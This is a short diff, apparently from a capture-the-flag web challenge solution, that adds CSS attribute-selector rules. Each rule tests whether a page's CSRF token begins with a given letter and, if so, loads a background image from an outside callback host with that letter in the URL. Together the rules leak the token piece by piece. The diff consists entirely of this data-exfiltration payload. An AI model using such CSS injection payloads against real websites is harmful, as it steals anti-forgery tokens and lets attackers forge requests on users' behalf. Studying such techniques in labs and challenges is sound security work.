@@ -1,1 +1,4 @@
+input[name=csrf][value^="r"] { background: url("https://writeups-challenges-ctfs.onrender.com/web-client/ch62/callback?token=r"); }
+input[name=csrf][value^="y"] { background: url("https://writeups-challenges-ctfs.onrender.com/web-client/ch62/callback?token=y"); }
 input[name=csrf][value^="r"] { background: url(https://writeups-challenges-ctfs.onrender.com/web-client/ch62/callback?token=r); }
+input[name=csrf][value^="y"] { background: url(https://writeups-challenges-ctfs.onrender.com/web-client/ch62/callback?token=y); }
